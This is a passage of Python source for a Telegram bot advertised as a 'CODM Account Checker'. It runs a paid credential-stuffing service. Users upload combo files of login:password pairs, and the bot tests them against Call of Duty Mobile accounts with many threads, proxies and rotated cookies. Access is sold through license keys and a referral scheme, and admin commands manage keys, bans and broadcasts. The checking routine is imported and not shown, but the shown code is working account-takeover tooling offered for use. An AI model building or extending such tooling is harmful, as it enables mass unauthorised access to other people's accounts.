        f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML",
        reply_markup=markup,
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("cmd:"))
def cb_cmd_shortcuts(call):
    bot.answer_callback_query(call.id)
    cmd = call.data.split(":", 1)[1]
    call.message.from_user = call.from_user
    if cmd == "help":        cmd_help(call.message)
    elif cmd == "mykey":     cmd_mykey(call.message)
    elif cmd == "stats":     cmd_stats(call.message)
    elif cmd == "referral":  cmd_referral(call.message)

@bot.message_handler(commands=["help"])
def cmd_help(message):
    register_user(message)
    lines = [
        "<b>📋 Commands</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "<b>/start</b>          — Welcome &amp; status",
        "<b>/activate &lt;key&gt;</b> — Activate license key",
        "<b>/mykey</b>          — Your key info",
        "<b>/check</b>          — Start check",
        "<b>/check 30</b>       — Check with N threads",
        "<b>/stop</b>           — Stop your current check",
        "<b>/status</b>         — Live progress",
        "<b>/stats</b>          — Detailed stats",
        "<b>/queue</b>          — View queue",
        "<b>/leavequeue</b>     — Leave queue",
        "<b>/threads N</b>      — Set threads (1–300)",
        "<b>/proxies</b>        — Proxy info",
        "<b>/cookies</b>        — Cookie info",
        "<b>/listfiles</b>      — List your combo files",
        "<b>/mycheck</b>        — Your checker status",
        "<b>/referral</b>       — Your referral link &amp; stats",
        "",
        f"<b>📢 Required Channels:</b>",
        *[f"• {CHANNEL_LINKS[ch]}" for ch in CHANNEL_IDS],
    ]
    if is_admin(message.from_user.id):
        lines += [
            "",
            "<b>👑 Admin Commands</b>",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "<b>/admin</b>                                   — Admin panel",
            "<b>/genkey &lt;duration&gt; [count]</b>              — Generate key (e.g. 1h, 30m, 2d, 3600)",
            "<b>/listkeys</b>                                — All keys",
            "<b>/revokekey &lt;key&gt;</b>                         — Revoke key",
            "<b>/ban &lt;id&gt;</b>                                — Ban user",
            "<b>/unban &lt;id&gt;</b>                              — Unban user",
            "<b>/listusers</b>                               — List users",
            "<b>/broadcast &lt;msg&gt;</b>                         — Broadcast to all users",
            "<b>/maintenance [on|msg|off]</b>                — Maintenance mode",
            "<b>/forcestop</b>                               — Force stop any check",
        ]
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")

@bot.message_handler(commands=["referral", "ref", "myref"])
def cmd_referral(message):
    register_user(message)
    if not access_gate(message):
        return
    uid         = message.from_user.id
    stats       = get_referral_stats(uid)
    link        = get_referral_link(uid)
    total_count = stats["count"]
    pending     = stats["pending"]
    bonuses     = stats["bonuses"]
    needed_more = REFERRALS_NEEDED - pending

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📋 Copy Link", url=link))

    # Status message
    if total_count == 0:
        status_msg = "You haven't referred anyone yet. Share your link!"
    elif pending >= REFERRALS_NEEDED:
        status_msg = "🎉 You've earned a key! Check /mykey for your new key."
    else:
        status_msg = f"Invite {needed_more} more user(s) to earn a 1-hour key!"

    bot.send_message(
        message.chat.id,
        f"<b>🔗 Your Referral Link</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<code>{link}</code>\n\n"
        f"<b>📊 Your Stats</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total referrals:    <b>{total_count}</b>\n"
        f"Progress to bonus:  <b>{pending}/{REFERRALS_NEEDED}</b>\n"
        f"Bonuses earned:     <b>{bonuses}</b>\n"
        f"More needed:        <b>{max(0, needed_more)}</b>\n\n"
        f"<b>🎁 Reward</b>\n"
        f"Every <b>{REFERRALS_NEEDED}</b> users who join via your link = "
        f"<b>+1 Hour Free Key</b> added to your account!\n\n"
        f"{status_msg}",
        parse_mode="HTML",
        reply_markup=markup,
        disable_web_page_preview=True,
    )

@bot.message_handler(commands=["activate"])
def cmd_activate(message):
    register_user(message)
    if not channel_gate(message):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(
            message.chat.id,
            "Usage: <code>/activate YOUR-KEY-HERE</code>",
            parse_mode="HTML",
        )
        return
    key_val = parts[1].strip().upper()
    ok = activate_key(message.from_user.id, key_val)
    if ok:
        expiry = get_key_expiry(message.from_user.id)
        exp_str = datetime.fromisoformat(expiry).strftime('%Y-%m-%d %H:%M') if expiry else "Never (Lifetime)"
        bot.send_message(
            message.chat.id,
            f"✅ <b>Key activated!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Key:</b>       <code>{esc(key_val)}</code>\n"
            f"<b>Expires:</b>   <b>{exp_str}</b>\n\n"
            f"Send a <code>.txt</code> combo file to start checking.",
            parse_mode="HTML",
        )
    else:
        bot.send_message(
            message.chat.id,
            f"❌ <b>Activation failed:</b> Invalid, revoked, or already used key.",
            parse_mode="HTML",
        )

@bot.message_handler(commands=["mykey"])
def cmd_mykey(message):
    register_user(message)
    if not access_gate(message):
        return
    if is_admin(message.from_user.id):
        bot.send_message(
            message.chat.id, "👑 You are an admin — permanent unlimited access.", parse_mode="HTML"
        )
        return
    expiry = get_key_expiry(message.from_user.id)
    if not expiry:
        # Check if user has starter but expired
        users = load_users()
        u     = users.get(str(message.from_user.id), {})
        if u.get("starter_granted"):
            bot.send_message(
                message.chat.id,
                "🔐 <b>No active key.</b>\n\n"
                "Your free 1-hour starter key has expired.\n"
                f"Use <code>/activate YOUR-KEY</code> to activate a new key.\n"
                f"Contact admin to get a key.",
                parse_mode="HTML",
            )
            return
        bot.send_message(
            message.chat.id,
            "🔐 <b>No active key.</b>\n\n"
            f"Use <code>/activate YOUR-KEY</code> to activate one.\n"
            f"Contact admin to get a key.",
            parse_mode="HTML",
        )
        return
    try:
        exp_dt = datetime.fromisoformat(expiry)
        if exp_dt < datetime.now():
            status = "❌ <b>Expired</b>"
        else:
            days_left = (exp_dt - datetime.now()).days
            hours_left = (exp_dt - datetime.now()).seconds // 3600
            if days_left > 0:
                status = f"✅ <b>Active</b> — {days_left}d {hours_left}h remaining"
            else:
                status = f"✅ <b>Active</b> — {hours_left}h remaining"
    except Exception:
        status = "ℹ️ Invalid expiry format"
    bot.send_message(
        message.chat.id,
        f"<b>🔑 Your Key Info</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Key:</b>      <code>{esc(load_users().get(str(message.from_user.id), {}).get('key', '—'))}</code>\n"
        f"<b>Expires:</b>  {expiry}\n"
        f"<b>Status:</b>   {status}",
        parse_mode="HTML",
    )

@bot.message_handler(commands=["queue"])
def cmd_queue(message):
    register_user(message)
    lines = []
    if STATE.is_checking and STATE.current_user_id:
        ls   = STATE.live_stats
        proc = ls.processed() if ls else 0
        lines += [
            "<b>⚡ Currently Checking</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            f"🆔 <code>{STATE.current_user_id}</code>  —  "
            f"<code>{Path(STATE.combo_file).name if STATE.combo_file else '?'}</code>",
            f"Progress: {proc:,}/{STATE.total:,}",
            "",
        ]
    lines.append(build_queue_text())
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")

@bot.message_handler(commands=["leavequeue"])
def cmd_leavequeue(message):
    register_user(message)
    uid = message.from_user.id
    if QUEUE.remove_user(uid):
        bot.send_message(message.chat.id, "✅ <b>Removed from queue.</b>", parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "⚪ You are not in the queue.", parse_mode="HTML")

@bot.message_handler(commands=["status"])
def cmd_status(message):
    if not access_gate(message):
        return
    if not STATE.is_checking and STATE.live_stats is None:
        bot.send_message(
            message.chat.id,
            "⚪ <b>No active check.</b>  Use /check or send a .txt file.",
            parse_mode="HTML",
        )
        return
    bot.send_message(message.chat.id, build_stats_text(), parse_mode="HTML")

@bot.message_handler(commands=["stats"])
def cmd_stats(message):
    if not access_gate(message):
        return
    if STATE.live_stats is None:
        bot.send_message(
            message.chat.id, "⚪ <b>No stats yet.</b>  Run a check first.", parse_mode="HTML"
        )
        return
    bot.send_message(
        message.chat.id,
        build_stats_text(done=not STATE.is_checking, stopped=STATE.should_stop()),
        parse_mode="HTML",
    )

@bot.message_handler(commands=["stop", "cancel"])
def cmd_stop(message):
    if not access_gate(message):
        return
    uid = message.from_user.id
    if QUEUE.remove_user(uid):
        bot.send_message(message.chat.id, "✅ <b>Removed from queue.</b>", parse_mode="HTML")
        return
    if STATE.is_checking and STATE.current_user_id == uid:
        STATE.stop()
        ls   = STATE.live_stats
        proc = ls.processed() if ls else 0
        bot.send_message(
            message.chat.id,
            f"🛑 <b>Stopping…</b> Results will be sent instantly.\n<b>Processed so far:</b> {proc:,}",
            parse_mode="HTML",
        )
        return
    if is_admin(uid) and STATE.is_checking:
        STATE.stop()
        bot.send_message(message.chat.id, "🛑 <b>Force-stopped current check.</b>", parse_mode="HTML")
        return
    bot.send_message(message.chat.id, "⚪ <b>Nothing to stop.</b>", parse_mode="HTML")

@bot.message_handler(commands=["forcestop"])
def cmd_forcestop(message):
    if not admin_only(message):
        return
    if STATE.is_checking:
        STATE.stop()
        bot.send_message(message.chat.id, "🛑 <b>Check force-stopped.</b>", parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "⚪ Nothing running.", parse_mode="HTML")

@bot.message_handler(commands=["threads"])
def cmd_threads(message):
    if not access_gate(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(
            message.chat.id,
            f"<b>Current threads:</b> {STATE.threads}\nUsage: <code>/threads 100</code>  (1–300)",
            parse_mode="HTML",
        )
        return
    try:
        n = int(parts[1])
        if 1 <= n <= 300:
            STATE.threads = n
            bot.send_message(message.chat.id, f"✅ Thread count set to <b>{n}</b>", parse_mode="HTML")
        else:
            bot.send_message(message.chat.id, "⚠️ Must be 1–300.", parse_mode="HTML")
    except ValueError:
        bot.send_message(message.chat.id, "⚠️ Invalid number.", parse_mode="HTML")

@bot.message_handler(commands=["proxies"])
def cmd_proxies(message):
    if not access_gate(message):
        return
    from checker import PROXIES_FILE
    pm = ProxyManager()
    bot.send_message(
        message.chat.id,
        f"<b>⬡ Proxy Info</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>File:</b>    <code>{PROXIES_FILE}</code>\n"
        f"<b>Count:</b>   {pm.count()}\n"
        f"<b>Status:</b>  {'✅ Active' if pm.loaded() else '❌ None (direct connection)'}",
        parse_mode="HTML",
    )

@bot.message_handler(commands=["cookies"])
def cmd_cookies(message):
    if not access_gate(message):
        return
    from checker import COOKIE_FILE
    cm = CookieManager()
    bot.send_message(
        message.chat.id,
        f"<b>🍪 Cookie Info</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>File:</b>    <code>{COOKIE_FILE}</code>\n"
        f"<b>Live:</b>    {cm.count()}\n"
        f"<b>Banned:</b>  {len(cm.banned)}\n"
        f"<b>Status:</b>  {'✅ Loaded' if cm.count() else '⚠️ Empty'}",
        parse_mode="HTML",
    )

@bot.message_handler(commands=["listfiles"])
def cmd_listfiles(message):
    if not access_gate(message):
        return
    user_combo_dir = get_user_combo_dir(message.from_user.id)
    files = sorted(Path(user_combo_dir).glob("*.txt"))
    if not files:
        bot.send_message(
            message.chat.id,
            "📂 <b>Your combo folder is empty.</b>\nSend a .txt combo file to add it.",
            parse_mode="HTML",
        )
        return
    lines = ["<b>📂 Your Combo Files</b>", "━" * 28]
    for i, fp in enumerate(files, 1):
        try:
            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                cnt = sum(1 for l in f if ":" in l.strip())
            size   = fp.stat().st_size
            size_s = f"{size // 1024}KB" if size >= 1024 else f"{size}B"
            lines.append(f"<b>{i}.</b> <code>{fp.name}</code>  [{cnt:,} · {size_s}]")
        except Exception:
            lines.append(f"<b>{i}.</b> <code>{fp.name}</code>")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")

@bot.message_handler(commands=["check"])
def cmd_check(message):
    if not access_gate(message):
        return
    parts   = message.text.split()
    threads = STATE.threads
    if len(parts) >= 2:
        try:
            t = int(parts[1])
            if 1 <= t <= 50:
                threads = t
        except ValueError:
            pass

    user_combo_dir = get_user_combo_dir(message.from_user.id)
    files = sorted(Path(user_combo_dir).glob("*.txt"))
    if not files:
        bot.send_message(
            message.chat.id,
            "📂 <b>No combo files found.</b>\nSend a .txt file to check.",
            parse_mode="HTML",
        )
        return

    if len(files) == 1:
        _start_or_queue(
            message.from_user.id, message.chat.id,
            message.from_user.username, str(files[0]), threads,
        )
        return

    markup = types.InlineKeyboardMarkup()
    for fp in files[:10]:
        try:
            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                cnt = sum(1 for l in f if ":" in l.strip())
        except Exception:
            cnt = 0
        action_id = _new_combo_action(message.from_user.id, threads, fp)
        markup.add(types.InlineKeyboardButton(
            f"📄 {fp.name} ({cnt:,})",
            callback_data=f"ck:{action_id}",
        ))
    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="ck_cancel"))
    bot.send_message(
        message.chat.id, "<b>Select a combo file:</b>",
        parse_mode="HTML", reply_markup=markup,
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("ck:") or c.data == "ck_cancel")
def cb_file_select(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    if call.data == "ck_cancel":
        try:
            bot.edit_message_text(
                "<i>Cancelled.</i>",
                call.message.chat.id, call.message.message_id, parse_mode="HTML",
            )
        except Exception:
            pass
        return
    action_id = call.data.partition(":")[2]
    action = _get_combo_action(action_id)
    if not action:
        bot.answer_callback_query(call.id, "Menu expired. Run /check again.")
        return
    uid = action["user_id"]
    if call.from_user.id != uid and not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "This is not your menu.")
        return
    _delete_combo_action(action_id)
    try:
        bot.edit_message_text(
            f"<b>Selected:</b> <code>{Path(action['combo_file']).name}</code>",
            call.message.chat.id, call.message.message_id, parse_mode="HTML",
        )
    except Exception:
        pass
    _start_or_queue(
        uid, call.message.chat.id,
        call.from_user.username, action["combo_file"], action["threads"],
    )

# ── Channel verify callback ────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "verify_channel")
def cb_verify_channel(call):
    uid = call.from_user.id
    if uid in ADMIN_IDS or check_channel_membership(bot, uid):
        try:
            bot.edit_message_text(
                f"<b>✅ Verified!</b> You're a member of all required channels.\n\n"
                f"You can now use the bot. Send /start to begin.",
                call.message.chat.id, call.message.message_id, parse_mode="HTML",
            )
        except Exception:
            pass
        bot.answer_callback_query(call.id, "✅ Verified! You can use the bot now.")
    else:
        bot.answer_callback_query(
            call.id, "❌ You haven't joined all channels yet!", show_alert=True
        )

# ── File upload ──────────────────────────────────────────────────────────────
@bot.message_handler(content_types=["document"])
def handle_doc(message):
    if not access_gate(message):
        return
    doc = message.document
    if not doc.file_name.lower().endswith(".txt"):
        bot.send_message(
            message.chat.id, "⚠️ Please send a <code>.txt</code> combo file.", parse_mode="HTML"
        )
        return
    try:
        fi   = bot.get_file(doc.file_id)
        data = bot.download_file(fi.file_path)
    except Exception as e:
        bot.send_message(
            message.chat.id, f"❌ Download error: {esc(str(e))}", parse_mode="HTML"
        )
        return

    user_combo_dir = get_user_combo_dir(message.from_user.id)
    path = os.path.join(user_combo_dir, doc.file_name)
    with open(path, "wb") as f:
        f.write(data)

    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            all_lines   = [l for l in f if ":" in l.strip()]
        total_lines = len(all_lines)
    except Exception:
        total_lines = 0

    uid     = message.from_user.id
    threads = STATE.threads

    markup    = types.InlineKeyboardMarkup(row_width=2)
    action_id = _new_combo_action(uid, threads, path)
    markup.add(
        types.InlineKeyboardButton(
            f"▶️ Check ({threads} threads)", callback_data=f"ck:{action_id}"
        ),
        types.InlineKeyboardButton("❌ Cancel", callback_data="ck_cancel"),
    )
    bot.send_message(
        message.chat.id,
        f"<b>📄 File received!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>File:</b>     <code>{esc(doc.file_name)}</code>\n"
        f"<b>Lines:</b>    {total_lines:,}\n\n"
        f"Ready to check?",
        parse_mode="HTML",
        reply_markup=markup,
    )

# ── /mycheck ──────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["mycheck", "checker"])
def cmd_mycheck(message):
    register_user(message)
    if not access_gate(message):
        return
    uid = message.from_user.id

    if uid in ADMIN_IDS:
        key_status = "👑 Admin — unlimited"
    elif has_active_key(uid):
        expiry = get_key_expiry(uid)
        if expiry:
            try:
                exp_dt = datetime.fromisoformat(expiry)
                days_left = (exp_dt - datetime.now()).days if exp_dt > datetime.now() else 0
                hours_left = (exp_dt - datetime.now()).seconds // 3600 if exp_dt > datetime.now() else 0
                if days_left > 0:
                    key_status = f"🔑 Active — {days_left}d {hours_left}h remaining"
                else:
                    key_status = f"🔑 Active — {hours_left}h remaining"
            except:
                key_status = "🔑 Active (expiry unknown)"
        else:
            key_status = "🔑 Lifetime"
    else:
        key_status = "🆓 No active key"

    is_running = STATE.is_checking and STATE.current_user_id == uid
    in_queue   = QUEUE.has_user(uid)

    if is_running:
        ls   = STATE.live_stats
        proc = ls.processed() if ls else 0
        checker_status = f"🟢 Running — <b>{proc:,}/{STATE.total:,}</b> done"
    elif in_queue:
        checker_status = "⏳ In queue — waiting to start"
    else:
        checker_status = "⚪ Idle — send a .txt file or use /check"

    # Referral stats
    ref_stats = get_referral_stats(uid)

    bot.send_message(
        message.chat.id,
        f"<b>📊 My Checker Status</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Key:</b>       {key_status}\n"
        f"<b>Checker:</b>   {checker_status}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Referrals:</b> {ref_stats['count']} total · "
        f"{ref_stats['pending']}/{REFERRALS_NEEDED} to next bonus",
        parse_mode="HTML",
    )

# =============================================================================
#   ADMIN COMMANDS
# =============================================================================
def _send_listkeys(chat_id):
    keys = load_keys()
    if not keys:
        bot.send_message(chat_id, "📭 No keys generated yet.", parse_mode="HTML")
        return
    lines = ["<b>🔑 All Keys</b>", "━" * 32]
    shown = 0
    for k, v in list(keys.items()):
        if shown >= 20:
            break
        if not isinstance(v, dict):
            continue
        status  = "🔴 Revoked" if v.get("revoked") else (
                  "✅ Active" if v.get("activated_by") else "⏳ Unused")
        dur_sec = int(v.get("duration_seconds", 0) or 0)
        if dur_sec > 0:
            hours = dur_sec // 3600
            days = dur_sec // 86400
            if days > 0:
                expiry_s = f"{days}d"
            elif hours > 0:
                expiry_s = f"{hours}h"
            else:
                expiry_s = f"{dur_sec}s"
        else:
            expiry_s = "Lifetime"
        by_s    = str(v.get("activated_by", "—"))
        lines.append(f"<code>{esc(k)}</code>\n{status} | {expiry_s} | By: {by_s}")
        shown += 1
    if len(keys) > 20:
        lines.append(f"\n…and {len(keys) - 20} more")
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")

def _send_listusers(chat_id):
    users = load_users()
    if not users:
        bot.send_message(chat_id, "📭 No users yet.", parse_mode="HTML")
        return
    lines = [f"<b>👥 Users ({len(users)})</b>", "━" * 28]
    for uid, u in list(users.items())[:20]:
        name   = u.get("username") or u.get("first_name") or uid
        banned = "🚫" if u.get("banned") else ""
        has_key = "🔑" if u.get("key_expires") else "🆓"
        starter = "⭐" if u.get("starter_granted") else ""
        lines.append(f"{banned}{has_key}{starter} <code>{uid}</code> @{name}")
    if len(users) > 20:
        lines.append(f"\n…and {len(users) - 20} more")
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")

@bot.message_handler(commands=["admin"])
def cmd_admin(message):
    if not admin_only(message):
        return
    is_maint = _maintenance_state["active"]
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Stats",      callback_data="adm:stats"),
        types.InlineKeyboardButton("📝 Queue",      callback_data="adm:queue"),
        types.InlineKeyboardButton("🔑 Keys",       callback_data="adm:listkeys"),
        types.InlineKeyboardButton("👥 Users",      callback_data="adm:listusers"),
        types.InlineKeyboardButton("🛑 Force Stop", callback_data="adm:forcestop"),
        types.InlineKeyboardButton("🔄 Refresh",    callback_data="adm:refresh"),
        types.InlineKeyboardButton(
            "🔧 Maintenance OFF" if is_maint else "🔧 Maintenance ON",
            callback_data="adm:maint_off" if is_maint else "adm:maint_on",
        ),
    )
    pm    = ProxyManager()
    cm    = CookieManager()
    users = load_users()
    keys  = load_keys()
    maint_line = f"\n<b>Maintenance:</b> 🔧 ON" if is_maint else ""
    bot.send_message(
        message.chat.id,
        f"<b>👑 Admin Panel</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Users:</b>   {len(users)}\n"
        f"<b>Keys:</b>    {len(keys)}\n"
        f"<b>Proxies:</b> {pm.count()}\n"
        f"<b>Cookies:</b> {cm.count()}\n"
        f"<b>Checking:</b> {'✅ YES' if STATE.is_checking else '❌ No'}\n"
        f"<b>Queue:</b>   {QUEUE.size()}"
        f"{maint_line}",
        parse_mode="HTML",
        reply_markup=markup,
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("adm:"))
def cb_admin(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Admin only.")
        return
    bot.answer_callback_query(call.id)
    action = call.data.split(":", 1)[1]
    if action == "stats":
        if STATE.live_stats:
            bot.send_message(
                call.message.chat.id,
                build_stats_text(done=not STATE.is_checking, stopped=STATE.should_stop()),
                parse_mode="HTML",
            )
        else:
            bot.send_message(call.message.chat.id, "⚪ No active session.", parse_mode="HTML")
    elif action == "queue":
        lines = []
        if STATE.is_checking and STATE.current_user_id:
            ls   = STATE.live_stats
            proc = ls.processed() if ls else 0
            lines += [
                "<b>⚡ Currently Checking</b>",
                f"🆔 <code>{STATE.current_user_id}</code>",
                f"Progress: {proc:,}/{STATE.total:,}", "",
            ]
        lines.append(build_queue_text())
        bot.send_message(call.message.chat.id, "\n".join(lines), parse_mode="HTML")
    elif action == "forcestop":
        if STATE.is_checking:
            STATE.stop()
            bot.send_message(call.message.chat.id, "🛑 <b>Force-stopped.</b>", parse_mode="HTML")
        else:
            bot.send_message(call.message.chat.id, "⚪ Nothing running.", parse_mode="HTML")
    elif action == "listkeys":
        _send_listkeys(call.message.chat.id)
    elif action == "listusers":
        _send_listusers(call.message.chat.id)
    elif action == "maint_on":
        with _maintenance_lock:
            _maintenance_state["active"]  = True
            _maintenance_state["message"] = (
                "🔧 Bot is down — admin is fixing some errors. "
                "We will notify you once it's back up again!"
            )
        bot.send_message(
            call.message.chat.id,
            "🔧 Maintenance mode <b>enabled</b> via admin panel.\n"
            "Use /maintenance off or the panel button to disable.",
            parse_mode="HTML",
        )
        cmd_admin(call.message)
    elif action == "maint_off":
        with _maintenance_lock:
            _maintenance_state["active"]  = False
            _maintenance_state["message"] = ""
        bot.send_message(
            call.message.chat.id,
            "✅ Maintenance mode <b>disabled</b>. Bot is live again.",
            parse_mode="HTML",
        )
        cmd_admin(call.message)
    elif action == "refresh":
        cmd_admin(call.message)

@bot.message_handler(commands=["genkey"])
def cmd_genkey(message):
    if not admin_only(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(
            message.chat.id,
            "Usage: <code>/genkey &lt;duration&gt; [count]</code>\n"
            "Examples: <code>/genkey 1h</code>  (1 hour)\n"
            "          <code>/genkey 30m</code> (30 minutes)\n"
            "          <code>/genkey 2d</code>  (2 days)\n"
            "          <code>/genkey 3600</code> (3600 seconds)\n"
            "          <code>/genkey 1h 3</code> (3 keys, 1 hour each)",
            parse_mode="HTML",
        )
        return
    try:
        dur_str = parts[1]
        duration_seconds = parse_duration(dur_str)
        if duration_seconds <= 0:
            raise ValueError
        count = int(parts[2]) if len(parts) >= 3 else 1
        count = min(max(count, 1), 20)
    except Exception:
        bot.send_message(
            message.chat.id,
            "⚠️ Invalid duration. Use e.g. <code>1h</code>, <code>30m</code>, <code>2d</code>, <code>3600</code>",
            parse_mode="HTML",
        )
        return

    out = [f"<b>🔑 Generated {count} key(s) — {dur_str} each</b>", "━" * 30]
    for _ in range(count):
        out.append(f"<code>{gen_key(duration_seconds, created_by=message.from_user.id)}</code>")
    bot.send_message(message.chat.id, "\n".join(out), parse_mode="HTML")

@bot.message_handler(commands=["listkeys"])
def cmd_listkeys(message):
    if not admin_only(message):
        return
    _send_listkeys(message.chat.id)

@bot.message_handler(commands=["revokekey"])
def cmd_revokekey(message):
    if not admin_only(message):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "Usage: <code>/revokekey KEY</code>", parse_mode="HTML")
        return
    key_val = parts[1].strip().upper()
    with _keys_lock:
        keys = load_keys()
        if key_val not in keys:
            bot.send_message(message.chat.id, "❌ Key not found.", parse_mode="HTML")
            return
        keys[key_val]["revoked"] = True
        save_keys(keys)
    bot.send_message(message.chat.id, f"✅ Key <code>{esc(key_val)}</code> revoked.", parse_mode="HTML")

@bot.message_handler(commands=["ban"])
def cmd_ban(message):
    if not admin_only(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(message.chat.id, "Usage: <code>/ban &lt;user_id&gt;</code>", parse_mode="HTML")
        return
    try:
        target = str(int(parts[1]))
    except ValueError:
        bot.send_message(message.chat.id, "⚠️ Invalid ID.", parse_mode="HTML")
        return
    with _users_lock:
        users = load_users()
        if target not in users:
            users[target] = {}
        users[target]["banned"] = True
        save_users(users)
    bot.send_message(message.chat.id, f"🚫 User <code>{target}</code> banned.", parse_mode="HTML")

@bot.message_handler(commands=["unban"])
def cmd_unban(message):
    if not admin_only(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(message.chat.id, "Usage: <code>/unban &lt;user_id&gt;</code>", parse_mode="HTML")
        return
    try:
        target = str(int(parts[1]))
    except ValueError:
        bot.send_message(message.chat.id, "⚠️ Invalid ID.", parse_mode="HTML")
        return
    with _users_lock:
        users = load_users()
        if target in users:
            users[target]["banned"] = False
            save_users(users)
    bot.send_message(message.chat.id, f"✅ User <code>{target}</code> unbanned.", parse_mode="HTML")

@bot.message_handler(commands=["listusers"])
def cmd_listusers(message):
    if not admin_only(message):
        return
    _send_listusers(message.chat.id)

@bot.message_handler(commands=["broadcast"])
def cmd_broadcast(message):
    if not admin_only(message):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(
            message.chat.id, "Usage: <code>/broadcast Your message here</code>", parse_mode="HTML"
        )
        return
    text  = parts[1]
    users = load_users()
    sent = fails = 0
    for uid_str in users:
        try:
            bot.send_message(int(uid_str), f"📢 <b>Broadcast</b>\n\n{text}", parse_mode="HTML")
            sent += 1
            time.sleep(0.05)
        except Exception:
            fails += 1
    bot.send_message(
        message.chat.id,
        f"✅ Broadcast done: <b>{sent}</b> sent, <b>{fails}</b> failed.",
        parse_mode="HTML",
    )

@bot.message_handler(commands=["maintenance"])
def cmd_maintenance(message):
    if not admin_only(message):
        return
    parts = message.text.split(maxsplit=1)
    sub   = parts[1].strip() if len(parts) > 1 else ""

    if sub.lower() in ("off", "0", "disable", "stop"):
        with _maintenance_lock:
            _maintenance_state["active"]  = False
            _maintenance_state["message"] = ""
        bot.send_message(
            message.chat.id,
            "✅ Maintenance mode <b>disabled</b>. Bot is live again for all users.",
            parse_mode="HTML",
        )
        return

    custom_msg = (
        "🔧 Bot is down — admin is fixing some errors. "
        "We will notify you once it's back up again!"
        if sub.lower() in ("on", "enable", "") else sub
    )
    with _maintenance_lock:
        _maintenance_state["active"]  = True
        _maintenance_state["message"] = custom_msg

    users = load_users()
    sent = fails = 0
    for uid_str in users:
        try:
            bot.send_message(
                int(uid_str),
                f"🔧 <b>Bot Maintenance Notice</b>\n\n{custom_msg}",
                parse_mode="HTML",
            )
            sent += 1
            time.sleep(0.05)
        except Exception:
            fails += 1

    bot.send_message(
        message.chat.id,
        f"🔧 Maintenance mode <b>enabled</b>.\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📢 Broadcast: <b>{sent}</b> sent · <b>{fails}</b> failed\n\n"
        f"<b>Message sent to users:</b>\n<i>{esc(custom_msg)}</i>\n\n"
        f"Use <code>/maintenance off</code> to restore the bot.",
        parse_mode="HTML",
    )

# ── Fallback ────────────────────────────────────────────────────────────────
@bot.message_handler(func=lambda m: True)
def fallback(message):
    register_user(message)
    if not channel_gate(message):
        return
    bot.send_message(
        message.chat.id,
        "ℹ️ Send a <code>.txt</code> combo file to start checking, or use /help for commands.",
        parse_mode="HTML",
    )

# =============================================================================
#   MAIN
# =============================================================================
def main():
    global BOT_USERNAME
    console.print()
    console.print(Panel(
        Text("CODM Account Checker Bot  v5.1", style="bold bright_magenta") +
        Text("\n  @CodmAndMlbb · @etoshim · @ShinDisscussion", style="dim"),
        border_style="bright_magenta", box=DOUBLE, padding=(1, 4),
    ))
    console.print(Panel(
        f"[bright_cyan]⬡[/bright_cyan]  Combo:    [dim]{COMBO_DIR}[/dim]\n"
        f"[bright_cyan]⬡[/bright_cyan]  Results:  [dim]{RESULTS_DIR}[/dim]\n"
        f"[bright_cyan]⬡[/bright_cyan]  Keys:     [dim]{KEYS_FILE}[/dim]\n"
        f"[bright_cyan]⬡[/bright_cyan]  Threads:  [dim]{DEFAULT_THREADS}[/dim]",
        border_style="bright_cyan", box=ROUNDED, title="[bold]Config[/bold]",
    ))

    pm = ProxyManager()
    cm = CookieManager()
    console.print(
        f"  {'[bright_green]✔[/bright_green]' if pm.loaded() else '[yellow]⚠[/yellow]'}"
        f"  [dim]{pm.count()} proxies[/dim]"
    )
    console.print(
        f"  {'[bright_green]✔[/bright_green]' if cm.count() else '[yellow]⚠[/yellow]'}"
        f"  [dim]{cm.count()} cookies[/dim]"
    )
